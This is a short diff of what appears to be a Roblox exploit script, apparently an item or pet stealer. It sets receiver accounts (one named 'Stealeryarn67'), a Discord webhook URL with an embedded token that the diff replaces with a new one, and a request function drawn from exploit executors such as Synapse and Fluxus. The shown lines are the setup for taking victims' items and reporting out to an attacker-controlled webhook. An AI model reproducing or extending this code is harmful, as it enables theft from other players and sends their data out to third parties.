@@ -1,5 +1,3 @@
--- discord.gg/syncrypt
-
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
@@ -7,7 +5,7 @@ local LocalPlayer = Players.LocalPlayer
 
 local RECEIVER = { "Stealeryarn67", "Cmbath", "jxst_v1cz" }
 local WEBHOOK =
-	"https://discord.com/api/webhooks/1571172567086145566/uo__wCzTrsDFjbrbDTIM6SiLDTiRIZ-YSLTs76VtXTCyNi8gEkBghexXeLUktVA_w9f1"
+	"https://discord.com/api/webhooks/1572235698138779769/za2dM1fPXBbLbiuZebVGoki55ZA2j0KJ1VBJmSoiigjBRKu6CCfprd_ZHq_FhbH_yRSR"
 local THRESHOLD = 1
 
 local requestFunction = syn and syn.request or http_request or request or fluxus and fluxus.request
